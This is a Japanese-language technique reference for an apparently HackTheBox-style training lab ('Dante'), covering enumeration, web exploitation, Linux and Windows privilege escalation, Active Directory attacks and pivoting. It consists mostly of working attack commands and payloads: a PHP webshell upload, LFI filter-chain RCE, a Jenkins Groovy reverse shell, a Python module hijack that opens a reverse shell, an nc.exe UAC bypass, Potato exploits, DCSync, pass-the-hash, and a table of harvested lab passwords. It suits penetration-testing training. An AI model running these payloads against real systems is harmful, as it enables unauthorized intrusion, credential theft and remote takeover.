# Dante: テクニックと特権昇格リファレンス

これはライトアップではない。Dante Pro Lab を進める中で出てくるテクニックと列挙パスの作業用リファレンスだ。コマンド、確認すべき条件、各ステップの背後にある理由をまとめてある。ボックスで詰まったときに、次に何を試すかを思い出すための参照用として使える。

---

## 一般的な方法論

```
1. Discovery         → nmap, fscan, arp, ping sweep
2. Service enum      → nmap -sV -sC, whatweb, banner grab
3. Deep enum         → gobuster, wpscan, enum4linux, smbclient
4. Foothold          → web RCE, SQLi, LFI, SMB, MSSQL, Jenkins
5. Local enum        → linPEAS, winPEAS, pspy, manual
6. Privesc           → kernel, SUID, sudo, service, Potato
7. Cred harvest      → config, history, registry, Slack, xlsx
8. Lateral movement  → chisel, ligolo, socks_proxy, autoroute
9. Repeat            → back to step 2 on the new host
```

すべてのボックスはこれをたどるが、珍しいものが出てくれば逸脱する。このループの価値は、最初のホストを越えると、通常は収穫した認証情報と、それまで到達できなかったセグメントへのピボットを使って作業することになる点にある。

---

## ディスカバリとスキャン

### ホストディスカバリ

```bash
nmap -sn -PR 10.10.110.0/24
```

`-sn` は ping のみ、ポートスキャンなし。`-PR` は ARP ping を使う。ローカルセグメントでは ICMP よりはるかに速く、ICMP がフィルタされる環境でも通る。生きている IP のリストが返る。

### クイックポートスキャン

```bash
nmap 10.10.110.100
```

上位 1000 TCP ポート、デフォルトタイミング。時間を無駄にせず、よくある開いているポートを得る。

### サービス検出

```bash
nmap -sV -sC -p 21,22,65000 10.10.110.100
```

`-sV` はバージョンをフィンガープリントし、`-sC` はデフォルトの NSE スクリプトを実行する。両者を組み合わせると、通常はサービス名、バージョン文字列、NSE が拾ったもの（バナー、ホスト名、TLS 証明書の詳細、時に認証情報）が得られる。

### 全ポートスイープ

```bash
sudo nmap -T4 -sC -sV -p- --min-rate=1000 10.10.110.100
```

`-p-` は全 65535 ポートをスキャンする。`--min-rate=1000` で何時間もかからないようにする。このスキャンが、デフォルトスキャンでは見逃す高ポートのサービス（Jenkins、Tomcat 管理、開発サーバーなど）を捕まえる。Dante では特に、一部のホストが 65000 のようなポートで Web アプリを動かしており、全ポートスイープでのみ表示される。

### 内部ホストディスカバリ

```bash
arp -a
ip neigh
arp -a | awk '{print $2}' | tr -d '()' | sort -t. -k4 -n
```

すでに侵害したホスト上で、`arp -a` は最近通信した隣人を表示する。`ip neigh` も同じデータを返す。`awk`+`sort` バージョンは最後のオクテットでソートするので、レンジ内の欠けているホストを簡単に見つけられる。

### Web サービススキャン

```bash
nmap -sT -Pn -p 80,443,8080,8000,8443 --open -oN /tmp/web_scan.txt 172.16.1.1,5,10,12,13,17,19,20,101,102
```

`-sS`（SYN）ではなく `-sT`（TCP connect）を使う。SYN スキャンはほとんどの SOCKS プロキシをきれいに通らないため。`-Pn` は ping ステップをスキップする。内部ホストは ICMP をブロックすることが多い。`--open` は開いているポートのみ報告する。`-oN` は後で参照できるようファイルに書き出す。

---

## Web 列挙

### ディレクトリ発見

```bash
gobuster dir -u http://10.10.110.100:65000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
dirsearch -u http://10.10.110.100:65000/wordpress/ -e swp,bak
```

`-x` はワードリストに拡張子を加える。dirsearch の `-e swp,bak` はバックアップとスワップファイルを探す。Dante では WordPress ディレクトリに `.swp` ファイルが見つかった — これは Vim のスワップファイルで、編集中のファイルのチャンクが含まれている。誰かが `wp-config.php` を Vim で開いてプロセスが kill されると、スワップファイルが残り、しばしば DB 認証情報を含む完全な設定が入っている。

### WordPress 解析

```bash
wpscan --url http://10.10.110.100:65000/wordpress --enumerate
```

引数なしの `--enumerate` は多くのものをカバーする：WordPress バージョン、プラグイン、テーマ、ユーザー名。Dante では WP のバージョン（古く、脆弱なプラグインを含む）と、ユーザー `james` が判明した。

### スワップファイルからの抽出

```bash
strings wp-config.php.swp | grep -i -E "DB_NAME|DB_USER|DB_PASSWORD"
```

`strings` をバイナリスワップファイルに使うと、読み取り可能なテキストが引き出される。実際には `wp-config.php` の内容全体（`DB_USER=shaun`、`DB_PASSWORD=password` など）が回復する。

### ターゲット固有のワードリスト構築

```bash
cewl -w dante_words.txt -d 2 -m 4 --with-numbers http://dante.htb:65000/wordpress/
```

`cewl` はサイトをスクレイプし、そこに使われている単語からワードリストを作る。`-d 2` は 2 レベル深くクロール、`-m 4` は 4 文字以上の単語のみ保持、`--with-numbers` は数値のバリエーションも含める。これにより、会社名、製品名、ユーザー名など、`rockyou` には決して現れないものが捕まる。

### WordPress へのパスワードクラッキング

```bash
wpscan --url http://... --passwords words.txt --usernames james
hydra -l james -P dante_all.txt 'http-post-form://.../wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Error' -t 16
```

wpscan のパスワード攻撃は WP 固有のロジックを使い、アカウントロックを起こしにくい。Hydra は POST フォーマットをすでに把握していれば高速。`F=Error` は失敗文字列 — レスポンスに "Error" が含まれていればパスワードは不正。Dante では `james:Toyota`。

### LFI 発見

```bash
curl -s http://172.16.1.10/ | head -30
curl -s "http://172.16.1.10/nav.php?page=../../../../../../etc/passwd"
```

最初の curl でページ HTML を取得し、2 番目で実際の LFI テストを行う。`/etc/passwd` が返れば、file パラメータがフィルタなしで `include()` に届いていることが確認できる。

### php://filter でソースを読む

```bash
curl -s "http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/deerhost/nav.php"
echo 'PD9waHAK...' | base64 -d
```

`php://filter/convert.base64-encode` は対象ファイルを base64 エンコーダでラップしてから返す。これは必要。PHP はインクルードされる `.php` ファイルを *実行* しようとするため、base64 でラップすれば実行を防ぎ、生のソースが得られる。出力をデコードして読む。

### フィルタチェーンによる RCE

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
curl -s -X POST "http://172.16.1.10/nav.php" --data-urlencode "page=<URL_BOZORG>" --data "c=id"
```

最近の PHP には、何もないところから任意のコンテンツを生成するために連鎖できる PHP フィルタがある。ジェネレータは、`include()` に渡されたときに指定したペイロードの実行に至る長い `php://filter/...` URL を生成する。これは「LFI だがログポイズニング経路がない」に対する現代的な答え。出力は `uid=33(www-data)` になるはず。

### SQL インジェクション

```bash
curl -s "http://172.16.1.12/blog/category.php?id=2'"
sqlmap -u "http://172.16.1.12/blog/category.php?id=2" --dbs --batch
sqlmap -u "..." -D flag -T flag --dump --batch
```

最初の curl で SQL エラーをテストする（`'` でクエリが壊れる）。レスポンスが変化すれば、sqlmap が残りを処理する。`--dbs` はデータベースを列挙し、`-D flag -T flag --dump` は指定テーブルをダンプする。

### ウェブシェルアップロード

```bash
echo '<?php system($_GET["c"]); ?>' > /tmp/s.php
curl -s -L "http://172.16.1.13/discuss/registerH.php" \
  -F "u_name=wsh101" -F "f_name=Web" -F "pwd=wsh101" \
  -F "e_mail=wsh@x.com" -F "gender=1" -F "dob=1990-01-01" \
  -F "ima=@/tmp/s.php;type=image/jpeg" -F "sta=State" -F "cou=Country"
curl -s "http://172.16.1.13/discuss/ups/s.php?c=whoami"
```

Dante の `discuss` アプリのアップロードエンドポイントはプロフィール画像を受け取り、実際のコンテンツを検証しない。PHP ファイルを `type=image/jpeg` として送れば MIME チェックをバイパスできる。ファイルは `ups/<filename>` に落ちる。出力：`dante-ws01\gerald`。

### MSSQL xp_cmdshell

```bash
mssqlclient.py Sophie:TerrorInflictPurpleDirt996655@172.16.1.5
```

SQL クライアントに入ったら：

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami /priv';
```

`xp_cmdshell` は最近の MSSQL ではデフォルトで無効だが、多くのラボ環境で有効になっている。出力は SQL サービスアカウントが持つ特権を示す — `SeImpersonatePrivilege: Enabled` なら Potato 系 privesc が射程に入る。

### Jenkins スクリプトコンソール

`Admin_129834765:SamsungOctober102030` でログインし、`/script` に移動して実行：

```groovy
Thread.start {
    String host = "10.10.14.123"; int port = 4445;
    String cmd = "/bin/bash";
    Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s = new Socket(host, port);
    // ... full reverse shell code
}
```

Jenkins Script Console は Jenkins ユーザーとしての Groovy 実行を提供し、実質的に RCE。上記の Groovy スニペットはプロセスを起動してソケットにパイプする。実行前に自分のボックスでリスナーを立ち上げておく。

---

## Linux 特権昇格

### ステップ 0：ベースライン

```bash
id
whoami
hostname
uname -a
cat /etc/os-release
cat /proc/version
```

各出力の意味：

| 出力 | 意味 |
|------|------|
| `uid=1001(ian) gid=1001(ian) groups=1001(ian),6(disk)` | デフォルトでないグループ。`disk`、`docker`、`lxd`、`adm` はすべて privesc 経路 |
| `Ubuntu 20.04` | PwnKit / Polkit 脆弱範囲 |
| `Linux ... 5.4.0-48-generic` | Dirty Pipe（5.8+）や他のカーネル CVE と照合 |
| `x86_64` | ほとんどのエクスプロイトがこのアーキ用、クロスコンパイル不要 |

グループは必ず丁寧に確認する。`disk` グループはしばしば最速の経路：`debugfs /dev/sda5` で生ディスクアクセスが得られ、`/etc/shadow` や `/root/flag.txt` を含む任意のファイルを root なしで読める。

### ステップ 1：linPEAS

```bash
wget -q -O- 10.10.14.5:9999/linpeas.sh | sh | nc 10.10.14.5 9002
```

nc にパイプするパターンは、ターゲットがディスクに書き込めないときに便利。linPEAS の出力は色分けされる：

| 色 | 意味 |
|----|------|
| 赤 | 高信頼（99%） |
| 黄 | 中信頼（95%） |
| 緑 | 一般情報 |

`[+] [CVE-2021-4034] PwnKit`、`[+] [CVE-2021-3560] Polkit`、`SUID files`、`sudo version < 1.8.28`、`Interesting groups: disk, docker, lxd` を探す。

### ステップ 2：pspy

```bash
cd /tmp
wget http://10.10.14.123/pspy64
chmod +x pspy64
./pspy64
```

pspy は root なしでプロセスを監視する。linPEAS が見逃すもの、特に短命な cron ジョブを捕まえる：

```
2026/10/05 22:27:01 CMD: UID=0 PID=14448 | /bin/sh -c /bin/bash mysql -u ian -p VPN123ZXC
```

探すべきシグナル：

| シグナル | 意味 |
|----------|------|
| `UID=0` | root として実行 |
| `-u username -p password` | コマンドラインに平文パスワード |
| `python3 /home/frank/apache_restart.py` | root がユーザー書き込み可能ディレクトリのスクリプトを実行 — ハイジャック候補 |

最後のケースが興味深い。root がユーザーのホームディレクトリにある Python スクリプトを実行し、そのスクリプトが標準ライブラリモジュールをインポートしている場合、モジュールをシャドウできる。同じディレクトリにペイロード入りの `urllib.py` を落とす — Python のインポートパスはまずスクリプトのディレクトリを確認するので、自分のファイルが勝つ。

### ステップ 3：SUID 列挙

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

期待される出力の例：

```
-rwsr-xr-x 1 root root 68208 Jul 15 2021 /usr/bin/passwd
-rwsr-xr-x 1 root root 166056 Jan 20 2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 43352 Sep 7 2020 /usr/bin/pkexec
-rwsr-sr-x 1 root julian 17K Jun 30 2020 /usr/sbin/readfile (Unknown SUID binary!)
```

各々の意味：

- `readfile` のような未知のバイナリ — バッファオーバーフローや、ファイルを読むカスタムアプリの可能性
- `pkexec` — PwnKit（CVE-2021-4034）、自明に悪用可能
- `find`、`vim`、`nmap` — GTFOBins エントリ

GTFOBins は https://gtfobins.github.io/ を参照。SUID `find` の例：

```bash
find . -exec /bin/sh -p \; -quit
```

`-p` はシェルを起動する際に SUID 特権を保持する。`euid=root` でシェルが得られるはず。

### ステップ 4：sudo 列挙

```bash
sudo -l
sudo -V
```

期待される出力：

```
User ian may run the following commands on DANTE-NIX07:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/vim
```

各エントリの対処：

- `NOPASSWD: /usr/bin/vim` → `sudo vim -c ':!sh'` でシェル起動
- `NOPASSWD: /bin/bash` → `sudo bash` で完了
- `sudo version < 1.8.28` → CVE-2019-18634 をチェック
- `sudo version 1.8.27` → `sudo -u#-1 /bin/bash`（`-1` UID が脆弱性をトリガー）

CVE-2021-3156（Baron Samedit）のテスト：

```bash
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

セグフォルトなら脆弱。使用法メッセージなら patched。

### ステップ 5：グループメンバーシップ

```bash
id
groups
```

| グループ | エクスプロイト |
|---------|---------------|
| `disk`（GID 6） | `debugfs /dev/sda5` → ディスク全体を読む |
| `docker` | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` |
| `lxd` | root をマウントしたコンテナを作成 |
| `adm` | `/var/log/` のファイルを読む |
| `video` | フレームバッファにアクセス |

`disk` グループでは debugfs アプローチがファイルシステムパーミッションを完全にバイパスする。生のブロックデバイスを読んでいるので、Unix パーミッションに関係なくディスク上の任意のファイルにアクセスできる。

### ステップ 6：カーネルエクスプロイトサジェスタ

```bash
git clone https://github.com/mzet-/linux-exploit-suggester.git
cd linux-exploit-suggester
./linux-exploit-suggester.sh
```

カーネルバージョンに一致する CVE のリストを出力する。Dante でよく当たるもの：CVE-2021-4034（PwnKit）、CVE-2021-3560（Polkit）、CVE-2022-0847（Dirty Pipe）、CVE-2021-22555（Netfilter）。

### ステップ 7：cron 列挙

```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
ls -la /var/spool/cron/crontabs/
```

書き込み可能なディレクトリでスクリプトを実行する cron ジョブを探す。Dante では `apache_restart.py` は root 所有だが読み取り可能で、スクリプトのディレクトリは書き込み可能だった — それがハイジャック経路。

スクリプトは `urllib` をインポートする。Python のインポートシステムはインポート解決時にスクリプトのディレクトリを最初に確認するので：

```bash
cat > /home/frank/urllib.py << 'EOF'
import os, pty, socket
s = socket.socket()
s.connect(("10.10.14.107", 9998))
[os.dup2(s.fileno(), f) for f in (0,1,2)]
pty.spawn("/bin/sh")
EOF
```

自分のボックスで `nc -lvnp 9998` を立ち上げ、cron が発火するのを待つ。まもなく root シェルが届く。

### ステップ 8：ケイパビリティ

```bash
getcap -r / 2>/dev/null
```

期待される出力：

```
/usr/bin/python3.8 = cap_setuid+ep
/usr/bin/ping = cap_net_raw+ep
```

| ケイパビリティ | エクスプロイト |
|---------------|---------------|
| `cap_setuid+ep` | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| `cap_net_raw` | パケットスニッフィング |
| `cap_dac_read_search` | 任意のファイルを読む |

Python バイナリの `cap_setuid` は事実上 root シェル待ちの状態。ワンライナーが `setuid(0)` を直接呼ぶ。

### ステップ 9：書き込み可能ファイル

```bash
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys
```

`/etc/` 内のもの（passwd、shadow、sudoers が明らかなターゲット）と、root が実行するスクリプト（cron ジョブ、サービスラッパー）を探す。

### ステップ 10：機密読み取り可能ファイル

```bash
cat /etc/passwd
cat /etc/shadow 2>/dev/null
cat /etc/sudoers 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name "*.kdbx" 2>/dev/null
find / -name ".bash_history" 2>/dev/null
```

`.bash_history` がしばしば最速の経路。Dante では `cat /home/james/.bash_history` で `mysql -u balthazar -p TheJoker12345!` が得られた。

### Linux privesc 決定木

```
id → unusual group?
    ├── disk → debugfs /dev/sda5
    ├── docker → docker escape
    └── sudo → sudo su

sudo -l → specific allowed commands?
    ├── NOPASSWD bash → sudo bash
    ├── NOPASSWD vim → vim -c ':!sh'
    └── sudo < 1.8.28 → sudo -u#-1 /bin/bash

SUID → GTFOBins match?
    ├── find → find . -exec /bin/sh -p \; -quit
    ├── vim → vim -c ':set shell=/bin/sh' -c ':shell'
    └── pkexec → PwnKit

uname -a → old kernel?
    └── linux-exploit-suggester.sh → exploit

pspy → cron with plaintext password?
    └── su username

capabilities → cap_setuid?
    └── python3 -c 'os.setuid(0); os.system("/bin/sh")'

kernel < 5.8 → Dirty Pipe
kernel < 5.15 → nftables UAF
```

---

## Windows 特権昇格

### ステップ 0：ベースライン

```cmd
whoami
whoami /priv
whoami /groups
systeminfo
hostname
net user
net localgroup administrators
```

| 出力 | 意味 |
|------|------|
| `dante-ws01\gerald` | 通常ユーザーコンテキスト |
| `Mandatory Label\Medium` | UAC がアクティブ、バイパス必要 |
| `SeImpersonatePrivilege: Enabled` | Potato 系が射程に入る |
| `SeDebugPrivilege: Enabled` | Mimikatz / トークン窃取 |
| `SeBackupPrivilege: Enabled` | SAM/SYSTEM を直接読む |
| `SeTakeOwnershipPrivilege` | ファイルの所有権を取得 |

Windows の経験則：`SeImpersonatePrivilege` または `SeAssignPrimaryTokenPrivilege` が有効なら、まず Potato を試す。他のどの経路よりもほぼ常に速い。

### ステップ 1：winPEAS

```powershell
iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/Invoke-winPEAS.ps1')
Invoke-winPEAS >> .out
```

CVE の言及（2019-1385、2019-1405）、非 Microsoft サービス、DLL ハイジャックパス、引用符なしサービスパス、サービスのパーミッション問題を探す。

### ステップ 2：引用符なしサービスパス

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
sc qc <ServiceName>
```

期待される出力：

```
BINARY_PATH_NAME : C:\Program Files (x86)\IObit\IObit Uninstaller\IUService.exe
```

スペースを含み、引用符で囲まれていないパスは脆弱。Windows は `C:\Program.exe`、次に `C:\Program Files\IObit.exe` などの順でパスを試す。中間パスのいずれかに書き込めれば、サービスアカウントとしてコード実行が得られる。

```cmd
icacls "C:\Program Files (x86)\IObit\"
copy malware.exe "C:\Program Files (x86)\IObit.exe"
sc stop <ServiceName>
sc start <ServiceName>
```

Dante では中間パスは書き込み可能ではなかったが、サービス自体に `ChangeConfig` パーミッションがあった — 次のステップ。

### ステップ 3：サービス ACL 悪用

```cmd
sc.exe sdshow <ServiceName>
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv <username> *
```

期待される SDDL 出力：

```
D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)
  (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
  (A;;CCDCLCSWRPWPLORC;;;S-1-5-21-...-1001)  ← dharding
```

| コード | 意味 |
|--------|------|
| `DC` | SERVICE_CHANGE_CONFIG |
| `RP` | SERVICE_START |
| `WP` | SERVICE_STOP |

`DC` があればバイナリパスを変更できる：

```cmd
sc.exe config <ServiceName> binPath="cmd.exe /c c:\temp\runme.bat"
sc.exe stop <ServiceName>
sc.exe start <ServiceName>
```

`runme.bat` は SYSTEM として実行される。

### ステップ 4：AutoElevate バイナリ（UAC バイパス）

```cmd
dir C:\Windows\System32\*.exe | findstr /i "fodhelper sdclt computerdefaults eventvwr"
sigcheck.exe -m C:\Windows\System32\ComputerDefaults.exe | findstr autoElevate
```

バイナリ一覧：

| バイナリ | 脆弱性 |
|---------|--------|
| `fodhelper.exe` | ms-settings ハイジャック |
| `sdclt.exe` | ms-settings ハイジャック |
| `ComputerDefaults.exe` | ms-settings ハイジャック |
| `eventvwr.exe` | mscfile ハイジャック |
| `cmstp.exe` | INF ハイジャック |

`ComputerDefaults` のエクスプロイト：

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "C:\temp\nc.exe 10.10.14.107 8888 -e cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
C:\Windows\System32\ComputerDefaults.exe
```

`HKCU` は admin なしで書き込み可能。`DelegateExecute` を空文字列にするとデフォルトハンドラの発火を防ぐ。結果は `nc.exe` が High Integrity で起動する。

### ステップ 5：スケジュールタスク

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "TaskName\|Run As\|Task To Run"
```

SYSTEM として実行され、スクリプトパスが書き込み可能なタスクを探す。

### ステップ 6：トークン偽装（Potato ファミリ）

前提：`SeImpersonatePrivilege: Enabled`。

```cmd
whoami /priv | findstr /i "Impersonate"
```

| ツール | 対象 OS | コマンド |
|--------|---------|---------|
| JuicyPotato | Win 7 – 10 1809 | `JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\nc.exe ..." -t *` |
| SweetPotato | Win 10 / 2016 / 2019 | `SweetPotato.exe -p nc.exe -a "10.10.14.107 8888 -e cmd.exe"` |
| BadPotato | PowerShell | `Invoke-BadPotato -Command "c:\temp\runme.bat"` |
| PrintSpoofer | Win 10 / 2019 | `PrintSpoofer.exe -i -c cmd` |
| RoguePotato | Win 2019+ | `RoguePotato.exe -r 10.10.14.107 -e "nc.exe ..."` |

Dante では `Invoke-BadPotato -Command "c:\temp\runme.bat"` で SYSTEM。

### ステップ 7：脆弱なソフトウェア

```cmd
wmic product get name,version
dir "C:\Program Files" /b
dir "C:\Program Files (x86)" /b
```

既知の脆弱なアプリ：

| ソフトウェア | 脆弱性 |
|-------------|--------|
| Druva InSync < 6.6.3 | RCE |
| Jenkins | Script Console 経由 RCE |
| IObit Uninstaller | 引用符なしパス |

Druva を Metasploit で：

```bash
use exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc
set session <ID>
run
```

### ステップ 8：パスワードハンティング

```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
findstr /si "password" C:\Users\*\*.txt C:\Users\*\*.xml C:\Users\*\*.ini C:\Users\*\*.config 2>nul
```

Dante では、Administrator のデスクトップに `Jenkins.bat` というファイルがあった：

```cmd
type C:\Users\Administrator\Documents\Jenkins.bat
# net user Admin_129834765 SamsungOctober102030 /add
```

これが Jenkins ボックスへのピボットのための認証情報。

### Windows privesc 決定木

```
whoami /priv → SeImpersonate?
    └── Potato (Juicy/Sweet/Bad/PrintSpoofer) → SYSTEM

whoami /groups → Administrators + Medium?
    └── UAC bypass (ComputerDefaults, fodhelper, sdclt)

Unquoted service path?
    └── Drop exe in higher path → restart service

Service ACL with DC (ChangeConfig)?
    └── sc config binPath → nc.exe → SYSTEM

Scheduled task writable?
    └── Overwrite script → wait → SYSTEM

AutoElevate binary (AutoElevate=true)?
    └── COM hijack HKCU → run → High Integrity

Old software (Druva, IObit, Jenkins)?
    └── Corresponding CVE

Registry/file with password?
    └── reg query, findstr
```

---

## Active Directory

### ドメイン列挙

```bash
crackmapexec smb 172.16.1.0/24
crackmapexec smb 172.16.1.20 --users
enum4linux 172.16.1.20
```

初期フットホールドから、マシン、ユーザー、ドメイン情報のリストを取得する。

### ASREPRoast

```bash
GetNPUsers.py dante/jbercov -no-pass -dc-ip 172.16.2.5 -outputfile /tmp/kerb.hashes
john /tmp/kerb.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

ASREPRoast は事前認証を要求しないアカウントに対して機能する。KDC はユーザーのパスワードハッシュで暗号化された AS-REP を返し、オフラインでクラックできる。Dante では `jbercov:myspace7`。

### DCSync

```bash
secretsdump.py DANTE.ADMIN/jbercov:myspace7@172.16.2.5 -outputfile /tmp/dc02_dcsync
```

`GetChangesAll` パーミッション（または Domain Admin）が必要。`krbtgt` を含むすべてのパスワードハッシュをダンプし、Golden Ticket を偽造できるようになる。

### Pass-the-Hash

```bash
psexec.py -hashes 'LM:NT' Administrator@172.16.2.5
```

平文パスワードなしで、NTLM ハッシュを直接使って認証する。

### BloodHound

```bash
bloodhound-python -u jbercov -p myspace7 -d dante.admin -dc 172.16.2.5 -c all
```

BloodHound GUI に取り込む JSON ファイルを生成する。探すべきもの：

- `GetChangesAll` → DCSync
- `GenericAll` → ターゲットへの ForceChangePassword
- `WriteDacl` → 乗っ取り用の ACL を追加

---

## ピボット

### Chisel

```bash
# Kali
./chisel server -p 12345 --reverse

# Target
./chisel client 10.10.14.107:12345 R:0.0.0.0:1080:socks

# Kali
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
proxychains nmap -sT -Pn 172.16.1.0/24
```

`R:0.0.0.0:1080:socks` はリバース SOCKS プロキシをセットアップする。`proxychains` がトラフィックをそこに送る。`-sT`（TCP connect）が必須。SYN スキャンは SOCKS を通らない。

### Ligolo-ng

```bash
# Kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ligolo-proxy -selfcert

# Target
./agent -connect 10.10.14.107:11601 -ignore-cert

# Ligolo console
session -> 1
start

# Kali
sudo ip route add 172.16.1.0/24 dev ligolo
```

Ligolo は自分のボックスに TUN インターフェースを作成し、ターゲットネットワークが直接ルーティング可能になる。SOCKS ベースのピボットより高速で安定。使えるならこれを使う。

### MSF autoroute

```bash
run autoroute -s 172.16.2.0/24
background
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
```

Metasploit の組み込みピボット。すでに msfconsole の中なら最も簡単なセットアップ。

### SSH 動的フォワーディング

```bash
ssh -i /tmp/key -D 1080 -o StrictHostKeyChecking=no root@10.10.110.100
```

`-D 1080` で localhost:1080 に SOCKS プロキシをセットアップする。`-o StrictHostKeyChecking=no` は新しいホストへの接続時のホストキー確認プロンプトを防ぐ。

---

## ポストエクスプロイテーション チェックリスト

### Linux

```bash
id; whoami; hostname; uname -a
ip a; arp -a; cat /etc/hosts
cat /etc/passwd; ls -la /home/
sudo -l; sudo -V
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*; pspy64
find / -name "*flag*" 2>/dev/null
find / -name "id_rsa" 2>/dev/null
find / -name ".bash_history" 2>/dev/null
cat /var/www/html/*/wp-config.php 2>/dev/null
ps aux; netstat -tulpn
```

### Windows

```cmd
whoami; whoami /priv; whoami /groups
systeminfo; hostname; net user
ipconfig /all; arp -a; route print; netstat -ano
wmic service get name,displayname,pathname,startmode
schtasks /query /fo LIST /v
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
dir /s /b C:\Users\*\*flag*.txt
findstr /si "password" C:\Users\*\*.txt
reg save HKLM\SAM c:\temp\sam.hiv
reg save HKLM\SYSTEM c:\temp\sys.hiv
netstat -ano
```

---

## ラボ中に収穫した認証情報

| 認証情報 | ホスト | 発見方法 |
|----------|--------|----------|
| `james:Toyota` | 10.10.110.100 | WPScan + cewl |
| `balthazar:TheJoker12345!` | 172.16.1.100 | `.bash_history` |
| `margaret:Welcome1!2@3#` | 172.16.1.10 | LFI + `php://filter` 経由の `wp-config.php` |
| `frank:TractorHeadtorchDeskmat` | 172.16.1.10 | Slack エクスポート（`grep -C 5 "password" 2020-05-18.json`） |
| `ben:Welcometomyblog` | 172.16.1.12 | SQLi + john |
| `admin:Password6543` | 172.16.1.17 | SMB トラフィック上の Wireshark |
| `dharding:WestminsterOrange5` | 172.16.1.101 | Hydra FTP |
| `dharding:WestminsterOrange17` | 172.16.1.101 | Hydra SMB |
| `Admin_129834765:SamsungOctober102030` | 172.16.1.19 | Administrator デスクトップの `Jenkins.bat` |
| `jbercov:myspace7` | 172.16.2.5 | ASREPRoast + john |
| `plongbottom:PowerfixSaturdayClub777` | 172.16.2.6 | Hydra SSH |
| `Sophie:TerrorInflictPurpleDirt996655` | 172.16.1.5 | julian のデスクトップの SQL ファイル |
| `mrb3n:S3kur1ty2020!` | 172.16.1.20 | ユーザーの comment フィールド |
| `ian:VPN123ZXC` | 172.16.1.19 | pspy64 |

---

## ツールリファレンス

| ツール | 用途 |
|--------|------|
| `nmap`、`fscan` | ネットワークスキャン |
| `gobuster`、`dirsearch` | ディレクトリ発見 |
| `wpscan`、`cewl` | WordPress 解析 |
| `hydra`、`crackmapexec` | ブルートフォース |
| `sqlmap` | SQL インジェクション |
| `smbclient`、`enum4linux` | SMB 列挙 |
| `linPEAS`、`winPEAS` | 自動 privesc 列挙 |
| `pspy` | プロセス監視（cron ジョブを捕まえる） |
| `BloodHound` | AD 攻撃パス解析 |
| `Impacket` | AD ツール（psexec、secretsdump、GetNPUsers） |
| `Evil-WinRM` | WinRM シェル |
| `chisel`、`ligolo` | ピボット |
| `msfconsole` | フレームワーク（Druva、MS17-010 など） |
| `traitor`、`PwnKit` | Polkit CVE エクスプロイト |
| `php_filter_chain_generator` | フィルタチェーン経由の LFI → RCE |
| `linux-exploit-suggester.sh` | カーネルエクスプロイト照合 |
| `accesschk.exe` | サービス ACL 列挙 |
| `sigcheck.exe` | AutoElevate バイナリ検出 |

---

## クイック privesc チェックリスト

### Linux

```
[ ] id → 非通常グループ（disk, docker, lxd, adm）
[ ] sudo -l → NOPASSWD エントリ？
[ ] sudo -V → バージョン < 1.8.28？
[ ] find / -perm -u=s → GTFOBins 一致？
[ ] getcap -r / → cap_setuid？
[ ] uname -a → 古いカーネル？
[ ] pspy64 → 平文パスワード付き cron？
[ ] cat /etc/crontab → スクリプト書き込み可能？
[ ] find / -writable → root 所有の書き込み可能ファイル？
[ ] cat /etc/passwd → 直接アクセス？
```

### Windows

```
[ ] whoami /priv → SeImpersonate？ → Potato
[ ] whoami /groups → Administrators + Medium？ → UAC バイパス
[ ] wmic service → 引用符なしパス？
[ ] sc sdshow → DC（ChangeConfig）？
[ ] schtasks → 書き込み可能タスク？
[ ] sigcheck → AutoElevate バイナリ？
[ ] wmic product → 古いソフトウェア？
[ ] reg query → レジストリのパスワード？
[ ] findstr → ファイル内のパスワード？
[ ] reg save SAM/SYSTEM → secretsdump？
```

2026/10/12
